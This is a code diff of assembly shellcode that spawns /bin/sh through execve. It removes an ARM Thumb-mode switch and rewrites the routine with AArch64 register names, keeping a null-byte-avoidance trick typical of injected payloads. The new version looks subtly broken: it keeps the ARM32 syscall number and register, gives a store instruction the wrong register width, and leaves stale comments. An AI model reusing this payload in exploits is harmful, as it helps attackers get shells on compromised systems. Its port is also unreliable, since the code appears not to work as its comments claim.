@@ -9,18 +9,12 @@
     .text
 
 _start:
-    // switch to thumb mode
-    .code 32
-    add    r3, pc, #1
-    bx     r3
-    
-    .code 16
     // execve("/bin/sh", NULL, NULL);
-    adr    r0, sh         // r0 = "/bin/sh"
-    eor    r1, r1, r1     // r1 = NULL
-    eor    r2, r2, r2     // r2 = NULL
-    strb   r2, [r0, #7]   // add null terminator
-    mov    r7, #11        // r7 = execve
+    adr    x0, sh         // r0 = "/bin/sh"
+    eor    x1, x1, x1     // r1 = NULL
+    eor    x2, x2, x2     // r2 = NULL
+    strb   x2, [x0, #7]   // add null terminator
+    mov    x7, #11        // r7 = execve
     svc    1
 sh:    
     .ascii "/bin/shX"
